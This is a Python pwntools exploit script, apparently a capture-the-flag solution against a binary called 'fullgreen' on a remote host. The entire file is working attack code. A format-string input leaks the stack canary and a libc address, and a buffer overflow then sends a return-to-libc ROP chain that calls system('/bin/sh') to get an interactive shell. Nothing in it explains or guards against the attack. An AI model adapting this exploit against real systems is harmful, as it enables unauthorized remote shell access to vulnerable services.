# coding: utf-8
from pwn import *
#p = process("./fullgreen")
p = remote("207.154.239.148", 1989)
elf = ELF("./fullgreen")
p.recv()
p.sendline(b"%15$p %89$p")
p.recv()
canary = 0xe6396830bec9fc00
libc = elf.libc
libc.address = 0x7f713aeb7000 - 2273280
binsh = next(libc.search(b"/bin/sh"))
syscall = libc.sym.system
poprdi = libc.address + 0x02a3e5
justret = libc.address + 0x029139
payload = b"A"*40 + p64(canary) + b"A"*8 + p64(poprdi) + p64(binsh) + p64(justret) + p64(syscall)
p.sendline(payload)
p.interactive()
